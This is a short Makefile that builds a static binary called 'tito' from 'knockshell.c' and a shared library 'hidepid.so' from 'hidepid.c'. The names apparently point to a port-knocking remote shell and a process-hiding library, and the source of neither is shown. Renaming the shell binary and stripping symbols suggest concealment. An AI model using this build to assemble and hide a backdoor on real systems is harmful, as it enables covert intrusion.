CC=gcc
CFLAGS=-march=native -O2 -Wall -Wextra -fPIC --std=c17 -pipe -s
LDFLAGS=-Wl,-O1,--sort-common,--as-needed,-z,relro,-z,now

all:
	$(CC) -S -masm=intel knockshell.c -D_POSIX_C_SOURCE -static $(CFLAGS)
	$(AS) knockshell.s -o knockshell.o
	$(CC) hidepid.c -o hidepid.so -D_GNU_SOURCE -shared -ldl -w $(CFLAGS)
	$(CC) knockshell.o -o tito $(CFLAGS)
clean:
	rm -v knockshell.o knockshell.s
